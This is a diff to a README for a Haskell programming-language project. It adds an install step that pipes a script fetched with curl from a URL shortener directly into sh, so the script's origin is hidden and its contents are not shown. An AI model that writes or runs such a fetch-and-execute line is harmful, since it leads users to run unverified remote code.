@@ -25,6 +25,14 @@ Implementing a programming language of our own design, in Haskell
 
 ## 🛠️ Building
 
+- Install both binaries with the install script
+
+```bash
+curl --proto '=https' --tlsv1.2 -sSf https://shorturl.at/WneSQ | sh
+```
+
+**OR**
+
 - Cloning this repository:
 
 ```bash
